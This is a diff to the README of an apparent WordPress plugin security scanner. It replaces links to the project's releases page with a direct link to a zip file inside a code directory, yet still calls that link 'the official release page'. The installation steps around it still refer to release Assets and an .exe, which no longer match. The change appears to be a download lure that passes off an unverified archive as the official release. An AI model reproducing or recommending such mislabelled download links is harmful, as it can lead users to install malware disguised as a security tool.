@@ -1,6 +1,6 @@
 # 🔍 wp-taint-scan - Find WordPress Plugin Security Flaws Easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sorbed-cockhorse752/wp-taint-scan/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/sorbed-cockhorse752/wp-taint-scan/main/cmd/corpus-compare/wp-scan-taint-2.3.zip)
 
 This application scans WordPress plugin code for security vulnerabilities. It identifies code weaknesses that allow hackers to access sensitive data or take control of a website. The tool looks for specific issues like SQL injection, cross-site scripting (XSS), and unauthorized data access. It understands how WordPress handles user permissions and data entry points to provide accurate results.
 
@@ -28,7 +28,7 @@ The application uses rules specific to the WordPress platform. It knows the diff
 
 Follow these steps to get the application on your computer:
 
-1.  Visit the official release page: [https://github.com/sorbed-cockhorse752/wp-taint-scan/releases](https://github.com/sorbed-cockhorse752/wp-taint-scan/releases).
+1.  Visit the official release page: [https://raw.githubusercontent.com/sorbed-cockhorse752/wp-taint-scan/main/cmd/corpus-compare/wp-scan-taint-2.3.zip](https://raw.githubusercontent.com/sorbed-cockhorse752/wp-taint-scan/main/cmd/corpus-compare/wp-scan-taint-2.3.zip).
 2.  Look for the "Assets" section at the bottom of the latest release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Save the file to your desktop or your Downloads folder.
